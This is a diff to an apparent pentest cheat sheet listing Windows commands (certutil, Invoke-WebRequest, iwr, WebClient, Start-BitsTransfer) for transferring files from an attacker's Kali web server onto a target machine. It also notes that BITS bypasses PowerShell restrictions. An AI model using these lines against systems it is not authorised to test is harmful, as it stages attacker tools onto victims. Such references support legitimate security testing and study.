@@ -40,6 +40,7 @@ Certutil # 1:certutil.exe -encode <filename1> encoded.txt # Encode file to base6
 Certutil # 1:certutil.exe -decode encoded.txt <filename1> # Decode base64 file on Windows; target-machine
 
 PowerShell # 1:Invoke-WebRequest -Uri http://<kali>:<kaliPort>/<filename1> -OutFile <filename1> # PowerShell v3+ download with aliases iwr; target-machine
+PowerShell # 1:iwr -Uri http://<kali>:<kaliPort>/<filename1> -OutFile <filename1> #download file from attacker web server using Invoke-WebRequest; target-machine
 PowerShell # 1:(New-Object Net.WebClient).DownloadFile('http://<kali>:<kaliPort>/<filename1>', '<filename1>') # PowerShell v2 compatible download - better for files or binary; target-machine
 PowerShell # 1:wget http://<kali>:<kaliPort>/<filename1> -o <filename1> # PowerShell alias for Invoke-WebRequest; target-machine
 PowerShell # 1:Start-BitsTransfer -Source http://<kali>:<kaliPort>/<filename1> -Destination <filename1> # BITS transfer works even when PowerShell is restricted; target-machine
